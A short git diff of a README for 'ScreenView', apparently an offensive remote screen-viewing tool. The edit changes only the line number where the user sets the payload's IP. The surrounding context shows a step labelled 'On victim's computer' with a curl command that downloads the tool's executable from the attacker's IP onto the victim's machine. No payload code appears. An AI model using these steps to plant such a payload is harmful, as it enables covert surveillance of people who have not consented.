@@ -19,7 +19,7 @@ $ sudo git clone https://github.com/BababooeyHackers/ScreenView.git
 
 ## Usage
 ### ScreenView.py
-This module can run on Windows and MacOS. To configure the payload go to line 40 and replace IP with your IP.
+This module can run on Windows and MacOS. To configure the payload go to line 32 and replace IP with your IP.
 ### On victim's computer
 ```
 $ curl http://IP/ScreenView/ScreenView.(exe, app, etc) --output ScreenView.(exe, app, etc)
